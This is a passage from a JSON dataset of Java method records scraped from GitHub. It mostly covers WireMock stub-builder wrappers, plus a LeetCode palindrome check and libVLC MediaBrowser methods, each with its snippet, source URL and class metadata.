["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder get(UrlPattern urlPattern) {    return WireMock.get(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "post", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder post(UrlPattern urlPattern) {    return WireMock.post(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "put", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder put(UrlPattern urlPattern) {    return WireMock.put(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "delete", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder delete(UrlPattern urlPattern) {    return WireMock.delete(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "patch", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder patch(UrlPattern urlPattern) {    return WireMock.patch(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "head", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder head(UrlPattern urlPattern) {    return WireMock.head(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "options", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder options(UrlPattern urlPattern) {    return WireMock.options(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "trace", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder trace(UrlPattern urlPattern) {    return WireMock.trace(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "any", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder any(UrlPattern urlPattern) {    return WireMock.any(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "request", "params": ["String", "UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder request(String method, UrlPattern urlPattern) {    return WireMock.request(method, urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "requestMatching", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder requestMatching(String matcherName) {    return WireMock.requestMatching(matcherName);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "requestMatching", "params": ["String", "Parameters"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder requestMatching(String matcherName, Parameters parameters) {    return WireMock.requestMatching(matcherName, parameters);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "requestMatching", "params": ["ValueMatcher<Request>"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder requestMatching(ValueMatcher<Request> requestMatcher) {    return WireMock.requestMatching(requestMatcher);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "aResponse", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder aResponse() {    return WireMock.aResponse();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "ok", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder ok() {    return WireMock.ok();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "ok", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder ok(String body) {    return WireMock.ok(body);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "okForContentType", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder okForContentType(String contentType, String body) {    return WireMock.okForContentType(contentType, body);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "okJson", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder okJson(String body) {    return WireMock.okJson(body);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "okXml", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder okXml(String body) {    return WireMock.okXml(body);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "okTextXml", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder okTextXml(String body) {    return WireMock.okTextXml(body);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "proxyAllTo", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder proxyAllTo(String url) {    return WireMock.proxyAllTo(url);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "get", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder get(String url) {    return WireMock.get(url);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "post", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder post(String url) {    return WireMock.post(url);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "put", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder put(String url) {    return WireMock.put(url);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "delete", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MappingBuilder", "snippet": "  public static MappingBuilder delete(String url) {    return WireMock.delete(url);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "created", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder created() {    return WireMock.created();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "noContent", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder noContent() {    return WireMock.noContent();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "permanentRedirect", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder permanentRedirect(String location) {    return WireMock.permanentRedirect(location);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "temporaryRedirect", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder temporaryRedirect(String location) {    return WireMock.temporaryRedirect(location);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "seeOther", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder seeOther(String location) {    return WireMock.seeOther(location);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "badRequest", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder badRequest() {    return WireMock.badRequest();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "badRequestEntity", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder badRequestEntity() {    return WireMock.badRequestEntity();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "unauthorized", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder unauthorized() {    return WireMock.unauthorized();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "forbidden", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder forbidden() {    return WireMock.forbidden();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "notFound", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder notFound() {    return WireMock.notFound();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "serverError", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder serverError() {    return WireMock.serverError();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "serviceUnavailable", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder serviceUnavailable() {    return WireMock.serviceUnavailable();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "status", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResponseDefinitionBuilder", "snippet": "  public static ResponseDefinitionBuilder status(int status) {    return WireMock.status(status);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder getRequestedFor(UrlPattern urlPattern) {    return WireMock.getRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "postRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder postRequestedFor(UrlPattern urlPattern) {    return WireMock.postRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "putRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder putRequestedFor(UrlPattern urlPattern) {    return WireMock.putRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "deleteRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder deleteRequestedFor(UrlPattern urlPattern) {    return WireMock.deleteRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "patchRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder patchRequestedFor(UrlPattern urlPattern) {    return WireMock.patchRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "headRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder headRequestedFor(UrlPattern urlPattern) {    return WireMock.headRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "optionsRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder optionsRequestedFor(UrlPattern urlPattern) {    return WireMock.optionsRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "traceRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder traceRequestedFor(UrlPattern urlPattern) {    return WireMock.traceRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "anyRequestedFor", "params": ["UrlPattern"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder anyRequestedFor(UrlPattern urlPattern) {    return WireMock.anyRequestedFor(urlPattern);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "requestMadeFor", "params": ["String", "Parameters"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder requestMadeFor(String customMatcherName, Parameters parameters) {    return WireMock.requestMadeFor(customMatcherName, parameters);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "requestMadeFor", "params": ["ValueMatcher<Request>"], "throws": null, "modifiers": ["public", "static"], "return_type": "RequestPatternBuilder", "snippet": "  public static RequestPatternBuilder requestMadeFor(ValueMatcher<Request> requestMatcher) {    return WireMock.requestMadeFor(requestMatcher);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "aMultipart", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "MultipartValuePatternBuilder", "snippet": "  public static MultipartValuePatternBuilder aMultipart() {    return WireMock.aMultipart();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "aMultipart", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "MultipartValuePatternBuilder", "snippet": "  public static MultipartValuePatternBuilder aMultipart(String name) {    return WireMock.aMultipart(name);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/WireMockUtils.java", "stars": "8", "class": {"name": "WireMockUtils", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "isPalindrome", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPalindrome(int x) {        if(x < 0 || ((x != 0) && (x % 10 == 0))) {            return false;        }        int rev = 0;        while(x>rev){            rev = rev * 10 + x % 10;            x /= 10;        }        return x == rev || x == rev / 10;    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/PalindromeNumber.java", "stars": "1", "class": {"name": "PalindromeNumber", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "reset", "params": [], "throws": null, "modifiers": ["synchronized", "private"], "return_type": "void", "snippet": "    private synchronized void reset() {        for (MediaDiscoverer md : mMediaDiscoverers)            md.release();        mMediaDiscoverers.clear();        mDiscovererMediaArray.clear();        if (mMedia != null) {            mMedia.release();            mMedia = null;        }        if (mBrowserMediaList != null) {            mBrowserMediaList.release();            mBrowserMediaList = null;        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "release", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void release() {        reset();        if (!mAlive)            throw new IllegalStateException(\"MediaBrowser released more than one time\");        mLibVlc.release();        mAlive = false;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "changeEventListener", "params": ["EventListener"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void changeEventListener(EventListener eventListener){        reset();        mEventListener = eventListener;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "startMediaDiscoverer", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void startMediaDiscoverer(String discovererName) {        MediaDiscoverer md = new MediaDiscoverer(mLibVlc, discovererName);        mMediaDiscoverers.add(md);        final MediaList ml = md.getMediaList();        ml.setEventListener(mDiscovererMediaListEventListener);        ml.release();        md.start();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "discoverNetworkShares", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void discoverNetworkShares() {        reset();        for (String discovererName : DISCOVERER_LIST)            startMediaDiscoverer(discovererName);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "discoverNetworkShares", "params": ["String"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void discoverNetworkShares(String discovererName) {        reset();        startMediaDiscoverer(discovererName);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "browse", "params": ["String"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void browse(String path) {        final Media media = new Media(mLibVlc, path);        browse(media);        media.release();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "browse", "params": ["Uri"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void browse(Uri uri) {        final Media media = new Media(mLibVlc, uri);        browse(media);        media.release();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "browse", "params": ["Media"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    public synchronized void browse(Media media) {        /* media can be associated with a medialist,         * so increment ref count in order to don't clean it with the medialist         */        media.retain();        media.addOption(IGNORE_LIST_OPTION+mIgnoreList);        reset();        mBrowserMediaList = media.subItems();        mBrowserMediaList.setEventListener(mBrowserMediaListEventListener);        media.parseAsync(Media.Parse.ParseNetwork);        mMedia = media;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMediaCount", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "    public synchronized int getMediaCount() {        return mBrowserMediaList != null ? mBrowserMediaList.getCount() : mDiscovererMediaArray.size();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/vlc/src/main/java/org/videolan/libvlc/util/MediaBrowser.java", "stars": "4", "class": {"name": "MediaBrowser", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMediaAt", "params": ["int"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "Media", "snippet": "    public synchronized Media getMediaAt(int index) {        if (index < 0 || index >= getMediaCount())            throw new IndexOutOfBoundsException();        final Media media = mBrowserMediaList != null ? mBrowserMediaList.getMediaAt(index) :                mDiscovererMediaArray.get(index);        media.retain();        return media;    }", "url": 